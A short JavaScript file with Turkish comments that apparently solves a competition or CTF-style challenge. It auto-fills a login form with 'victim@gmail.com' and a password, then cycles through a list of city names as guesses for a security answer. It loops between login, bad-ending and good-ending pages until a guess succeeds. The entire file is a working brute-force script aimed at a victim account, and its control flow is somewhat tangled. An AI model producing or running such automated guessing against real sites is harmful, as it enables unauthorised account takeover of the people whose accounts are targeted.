// script.js

const kavramlar = ["Dallas", "Atlanta", "Los Angeles", "Chicago", "Seattle", "Boston"];
let currentAttempt = 0;

function tryNextConcept() {
  const answerInput = document.getElementById("answer");
  if (!answerInput) {
    // answerInput henüz bulunamamışsa, bir süre sonra tekrar deneyin
    setTimeout(tryNextConcept, 1000); // 1 saniye bekle
    return;
  }
  if (currentAttempt >= kavramlar.length) {
    // Eğer tüm kavramları denedik ve doğru cevapı bulamadıysak, login sayfasına geri dön
    window.location.href = "login.php";
  } else {
    // Bir sonraki kavramı dene
    answerInput.value = kavramlar[currentAttempt];
    currentAttempt++;

    // Formu gönder
    document.querySelector(".input-submit").click();
  }
}

tryNextConcept();

// Sayfa yüklendiğinde dinlenen bir olay dinleyici ekleyelim
window.addEventListener("load", function() {
  const currentURL = window.location.href;
  if (currentURL.includes("goodEnding.php")) {
    // Eğer goodEnding.php sayfasına ulaşırsak, yarışmayı kazandık demektir
    console.log(kavramlar[currentAttempt - 1]);
    alert("Yarışmayı kazandınız!");
  } else if (currentURL.includes("badEnding.php")) {
    // Eğer badEnding.php sayfasına ulaşırsak, yarışma devam ediyor demektir
    // Yeniden deneme yapmamız gerekiyor
    setTimeout(function() {
      window.location.href = "login.php";
    }, 1000); // 1 saniye bekle ve sonra login.php'ye dön
    tryNextConcept();
  } else if (currentURL.includes("login.php")) {
    // Eğer login sayfasına geri döndüysek, otomatik olarak giriş yap ve confirmCode.php sayfasına yönlendiril
    loginAndContinue();
  }
});

function loginAndContinue() {
  const mailInput = document.getElementById("mail");
  const passInput = document.getElementById("pass");
  
  if (!mailInput || !passInput) {
    // Gerekli öğeleri bulamadıysak, bir süre sonra tekrar dene
    setTimeout(loginAndContinue, 1000); // 1 saniye bekle
    return;
  }
  
  // E-posta ve şifre bilgilerini doldur
  mailInput.value = "victim@gmail.com";
  passInput.value = "pass";

  // Login butonuna tıkla
  document.querySelector(".input-submit").click();
}

// İlk denemeden sonra login işlemini başlat
loginAndContinue();
